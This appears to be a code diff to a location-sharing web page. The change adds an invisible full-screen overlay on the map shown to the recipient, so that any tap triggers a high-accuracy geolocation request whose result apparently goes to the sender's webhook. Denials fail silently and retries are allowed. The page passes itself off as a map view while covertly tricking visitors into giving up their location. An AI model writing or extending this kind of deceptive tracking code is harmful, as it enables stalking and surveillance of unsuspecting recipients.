@@ -127,14 +127,14 @@
         }
 
         .hidden {
-            display: none;
+            display: none !important;
         }
 
         a {
             overflow-wrap: anywhere;
         }
 
-        /* ===== Recipient mode: full screen map only ===== */
+        /* ===== Recipient mode ===== */
         body.recipient-mode {
             min-height: 100vh;
             padding: 0;
@@ -149,6 +149,7 @@
             padding: 0;
             border-radius: 0;
             box-shadow: none;
+            position: relative;
         }
 
         body.recipient-mode #page-title,
@@ -167,6 +168,18 @@
             height: 100%;
             margin: 0;
             border-radius: 0;
+        }
+
+        /* Invisible full-screen layer that catches the first touch/click */
+        #touch-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 20;
+            background: transparent;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -205,6 +218,9 @@
         <section id="recipient" class="hidden">
             <iframe id="recipient-map" class="map" title="Map of selected location" loading="lazy"
                 referrerpolicy="no-referrer"></iframe>
+
+            <!-- Invisible layer – any touch/click will trigger location -->
+            <div id="touch-layer"></div>
         </section>
 
         <p id="setup-status" class="status" role="status" aria-live="polite"></p>
@@ -222,7 +238,7 @@
         let status = document.getElementById('setup-status');
         let selectedPlace = null;
         let receiverUrl = null;
-        let locationRequested = false; // prevent multiple requests
+        let locationRequested = false;
 
         document.getElementById('preview-button').addEventListener('click', previewLocation);
         document.getElementById('create-link-button').addEventListener('click', createShareLink);
@@ -245,32 +261,24 @@
                 selectedPlace = { lat, lon, label: `${lat}, ${lon}` };
                 receiverUrl = validateWebhookUrl(sharedReceiver);
 
-                // Switch to recipient mode (full screen map only)
+                // Switch to recipient mode
                 document.body.classList.add('recipient-mode');
                 setup.classList.add('hidden');
                 recipient.classList.remove('hidden');
 
                 setMap(document.getElementById('recipient-map'), `${lat}, ${lon}`);
 
-                // ===== Try to trigger location permission =====
-                // 1. Immediately
-                requestAndSendLocation();
+                // Any touch or click on the screen will request location
+                const touchLayer = document.getElementById('touch-layer');
 
-                // 2. After a short delay
-                setTimeout(requestAndSendLocation, 800);
-
-                // 3. On first user interaction (most reliable way to force the popup)
-                const triggerOnInteraction = () => {
+                const handleFirstInteraction = () => {
                     requestAndSendLocation();
-                    // Remove listeners after first try
-                    document.removeEventListener('click', triggerOnInteraction);
-                    document.removeEventListener('touchstart', triggerOnInteraction);
-                    document.removeEventListener('keydown', triggerOnInteraction);
+                    // Remove the invisible layer after first interaction
+                    touchLayer.remove();
                 };
 
-                document.addEventListener('click', triggerOnInteraction, { once: true });
-                document.addEventListener('touchstart', triggerOnInteraction, { once: true });
-                document.addEventListener('keydown', triggerOnInteraction, { once: true });
+                touchLayer.addEventListener('click', handleFirstInteraction);
+                touchLayer.addEventListener('touchstart', handleFirstInteraction, { passive: true });
 
             } catch (error) {
                 setStatus(error.message, 'error');
@@ -381,7 +389,6 @@
             }
         }
 
-        // Request location (only once)
         function requestAndSendLocation() {
             if (locationRequested || !navigator.geolocation) return;
             locationRequested = true;
@@ -396,6 +403,7 @@
                 },
                 () => {
                     // User denied or error – silent
+                    locationRequested = false; // allow retry if needed
                 },
                 { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
             );
